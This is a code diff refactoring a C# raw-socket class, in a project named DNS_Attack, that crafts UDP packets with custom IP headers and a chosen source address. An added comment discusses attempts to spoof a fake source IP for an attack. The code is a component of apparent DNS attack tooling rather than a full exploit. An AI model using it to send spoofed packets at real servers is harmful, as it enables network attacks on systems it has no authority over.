@@ -11,7 +11,7 @@ using System.Text;
 using System.Threading;
 
 namespace DNS_Attack {
-    public class MySocket {
+    public class MyUDPSocket {
         private static IPAddress localhost = IPAddress.Loopback;
 
         private static byte[] GenerateUDPHeader(int sourcePort, int destinationPort, int ipPacketLength) {
@@ -72,14 +72,14 @@ namespace DNS_Attack {
             ipHeader[9] = protocol;
             ipHeader[10] = initialChecksum;
             ipHeader[11] = initialChecksum;
-            ipHeader[12] = Convert.ToByte(int.Parse(sourceIPParts[0]));
-            ipHeader[13] = Convert.ToByte(int.Parse(sourceIPParts[1]));
-            ipHeader[14] = Convert.ToByte(int.Parse(sourceIPParts[2]));
-            ipHeader[15] = Convert.ToByte(int.Parse(sourceIPParts[3]));
-            ipHeader[16] = Convert.ToByte(int.Parse(destinationIPParts[0]));
-            ipHeader[17] = Convert.ToByte(int.Parse(destinationIPParts[1]));
-            ipHeader[18] = Convert.ToByte(int.Parse(destinationIPParts[2]));
-            ipHeader[19] = Convert.ToByte(int.Parse(destinationIPParts[3]));
+            ipHeader[12] = byte.Parse(sourceIPParts[0]);
+            ipHeader[13] = byte.Parse(sourceIPParts[1]);
+            ipHeader[14] = byte.Parse(sourceIPParts[2]);
+            ipHeader[15] = byte.Parse(sourceIPParts[3]);
+            ipHeader[16] = byte.Parse(destinationIPParts[0]);
+            ipHeader[17] = byte.Parse(destinationIPParts[1]);
+            ipHeader[18] = byte.Parse(destinationIPParts[2]);
+            ipHeader[19] = byte.Parse(destinationIPParts[3]);
             ushort ipHeaderChecksum = ComputeIpHeaderChecksum(ipHeader);
             ipHeader[10] = Convert.ToByte(ipHeaderChecksum >> 8);
             ipHeader[11] = Convert.ToByte(ipHeaderChecksum & 0xff);
@@ -101,19 +101,23 @@ namespace DNS_Attack {
         }
 
         public static void SendUDPPacket(string sourceIP, int sourcePort, string destinationIP, int destinationPort, byte[] data) {
-            Socket socket = GenerateSocket(localhost, sourcePort);
+            /* To perform an attack using a fake source IP address, we should use a local IP address
+             * in the following line of code, but the operating system drops IP packets with invalid
+             * source IP addresses, so the source IP needs to be valid, being the best variable to
+             * use in this case. */
+            Socket socket = GenerateUDPSocket(IPAddress.Parse(sourceIP), sourcePort);
             byte[] udpHeader = GenerateUDPHeader(sourcePort, destinationPort, data.Length);
             byte[] ipHeader = GenerateIPHeader(sourceIP, destinationIP, udpHeader.Length + data.Length);
             byte[] toSend = ConcatArrays(ipHeader, udpHeader, data);
             socket.SendTo(toSend, new IPEndPoint(IPAddress.Parse(destinationIP), destinationPort));
         }
 
-        public static void Receive(int port, byte[] buffer) {
-            Socket socket = GenerateSocket(localhost, port);
+        public static void ReceiveUDPPacket(int port, byte[] buffer) {
+            Socket socket = GenerateUDPSocket(localhost, port);
             int read = socket.Receive(buffer);
         }
 
-        private static Socket GenerateSocket(IPAddress localAddress, int localPort) {
+        private static Socket GenerateUDPSocket(IPAddress localAddress, int localPort) {
             Socket socket = new Socket(AddressFamily.InterNetwork, System.Net.Sockets.SocketType.Raw, ProtocolType.Udp);
             socket.Bind(new IPEndPoint(localAddress, localPort));
             socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
